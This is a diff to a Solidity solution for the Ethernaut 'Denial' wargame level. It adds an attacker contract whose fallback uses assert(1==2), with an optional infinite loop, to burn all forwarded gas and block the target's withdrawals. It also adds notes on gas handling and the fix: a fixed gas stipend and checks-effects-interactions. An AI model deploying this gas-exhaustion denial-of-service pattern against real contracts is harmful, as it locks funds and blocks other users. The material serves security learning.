@@ -45,11 +45,34 @@ contract Denial {
 ///     Theres 2 ways to attack this, 
 ///     - Error handling
 ///     - Infinite loop
-///     ERROR HANDLING
+///     ERROR HANDLING - https://miro.medium.com/max/1400/1*6SbgstMKTckUrDT22c6fyg.png, https://www.youtube.com/watch?v=59MRDldSItU
+///         - revert and require will refund all of the gas to call
+///         - assert and throw will deplete the gas
+///         - all exceptions undoes all of the changes made, and flags an error
+///     Low level calls can be an "exception", (call, delegatecall, etc..) to the rule, they return a false instead of immediately reverting.
+
+///     Solution must be run with version ^0.6.0, because of whats mentioned here, https://ethereum.stackexchange.com/questions/107882/ethernaut-level-20-denial-probably-no-longer-solvable-why
 
 contract AttackDenial {
+
     fallback() external payable {
-      // consume all the gas
-      assert(1==2);
-  }
+        // consume all the gas with error handling
+        assert(1==2);
+
+        // Throw is deprecated
+        //   if(true){
+        //     throw;
+        //   }
+
+        // Infinite loop to spend all of the gas
+        // while(true){
+
+        // }
+    }
 }
+
+/// This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.
+/// If you are using a low level call to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend. For example call.gas(100000).value().
+/// Follow Check-Effects-Interactions, http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern
+/// Fix =   - Check-effect-interaction patterns to check the amount transferred
+///         - low level call needs to specify the amount of gas spent ex. receiver.call.gas(10000).value()
